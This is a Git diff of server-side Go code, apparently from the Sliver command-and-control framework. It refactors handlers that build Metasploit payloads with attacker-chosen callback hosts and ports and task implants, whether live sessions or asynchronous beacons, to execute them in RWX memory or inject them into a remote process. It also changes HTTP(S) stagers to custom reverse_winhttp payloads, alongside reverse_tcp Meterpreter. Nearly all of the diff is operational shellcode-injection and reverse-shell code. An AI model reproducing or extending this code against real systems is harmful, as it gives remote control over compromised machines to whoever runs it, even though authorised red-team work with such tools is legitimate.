@@ -20,6 +20,7 @@ package rpc
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"math/rand"
 	"path"
@@ -28,81 +29,119 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
-	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/server/db"
+	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/msf"
+)
 
-	"github.com/golang/protobuf/proto"
+var (
+	msfLog = log.NamedLogger("rcp", "msf")
 )
 
 // Msf - Helper function to execute MSF payloads on the remote system
-func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Empty, error) {
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Task, error) {
+	var os string
+	var arch string
+	if !req.Request.Async {
+		session := core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+		os = session.OS
+		arch = session.Arch
+	} else {
+		beacon, err := db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			msfLog.Errorf("%s\n", err)
+			return nil, ErrDatabaseFailure
+		}
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
+		os = beacon.OS
+		arch = beacon.Arch
 	}
 
-	config := msf.VenomConfig{
-		Os:         session.Os,
-		Arch:       msf.Arch(session.Arch),
+	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
+		Os:         os,
+		Arch:       msf.Arch(arch),
 		Payload:    req.Payload,
 		LHost:      req.LHost,
 		LPort:      uint16(req.LPort),
 		Encoder:    req.Encoder,
 		Iterations: int(req.Iterations),
 		Format:     "raw",
-	}
-	rawPayload, err := msf.VenomPayload(config)
+	})
 	if err != nil {
 		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
 		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.TaskReq{
+	taskReq := &sliverpb.TaskReq{
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
-	})
-	timeout := rpc.getTimeout(req)
-	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
+		Request:  req.Request,
+	}
+	resp := &sliverpb.Task{Response: &commonpb.Response{}}
+	err = rpc.GenericHandler(taskReq, resp)
 	if err != nil {
 		return nil, err
 	}
-	return &commonpb.Empty{}, nil
+	return resp, nil
 }
 
 // MsfRemote - Inject an MSF payload into a remote process
-func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*commonpb.Empty, error) {
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*sliverpb.Task, error) {
+	var os string
+	var arch string
+	if !req.Request.Async {
+		session := core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+		os = session.OS
+		arch = session.Arch
+	} else {
+		beacon, err := db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			msfLog.Errorf("%s\n", err)
+			return nil, ErrDatabaseFailure
+		}
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
+		os = beacon.OS
+		arch = beacon.Arch
 	}
 
-	config := msf.VenomConfig{
-		Os:         session.Os,
-		Arch:       msf.Arch(session.Arch),
+	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
+		Os:         os,
+		Arch:       msf.Arch(arch),
 		Payload:    req.Payload,
 		LHost:      req.LHost,
 		LPort:      uint16(req.LPort),
 		Encoder:    req.Encoder,
 		Iterations: int(req.Iterations),
 		Format:     "raw",
-	}
-	rawPayload, err := msf.VenomPayload(config)
+	})
 	if err != nil {
 		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.TaskReq{
+	taskReq := &sliverpb.TaskReq{
 		Pid:      req.PID,
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
-	})
-	timeout := rpc.getTimeout(req)
-	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
+		Request:  req.Request,
+	}
+	resp := &sliverpb.Task{Response: &commonpb.Response{}}
+	err = rpc.GenericHandler(taskReq, resp)
 	if err != nil {
 		return nil, err
 	}
-	return &commonpb.Empty{}, nil
+	return resp, nil
 }
 
 // MsfStage - Generate a MSF compatible stage
@@ -127,18 +166,18 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 	case clientpb.StageProtocol_TCP:
 		payload = "meterpreter/reverse_tcp"
 	case clientpb.StageProtocol_HTTP:
-		payload = "meterpreter/reverse_http"
+		payload = "custom/reverse_winhttp"
 		uri = generateCallbackURI()
 	case clientpb.StageProtocol_HTTPS:
-		payload = "meterpreter/reverse_https"
+		payload = "custom/reverse_winhttps"
 		uri = generateCallbackURI()
 	default:
-		return MSFStage, fmt.Errorf("Protocol not supported")
+		return MSFStage, errors.New("protocol not supported")
 	}
 
 	// We only support windows at the moment
 	if req.GetOS() != "windows" {
-		return MSFStage, fmt.Errorf("%s is currently not suppoprted", req.GetOS())
+		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
 	}
 
 	venomConfig := msf.VenomConfig{
@@ -158,7 +197,7 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 		return MSFStage, err
 	}
 	MSFStage.File.Data = stage
-	name, err := generate.GetCodename()
+	name, err := codenames.GetCodename()
 	if err != nil {
 		return MSFStage, err
 	}
@@ -183,7 +222,7 @@ func generateCallbackURI() string {
 func randomPath(segments []string, filenames []string) []string {
 	seed := rand.NewSource(time.Now().UnixNano())
 	insecureRand := rand.New(seed)
-	n := insecureRand.Intn(3) // How many segements?
+	n := insecureRand.Intn(3) // How many segments?
 	genSegments := []string{}
 	for index := 0; index < n; index++ {
 		seg := segments[insecureRand.Intn(len(segments))]
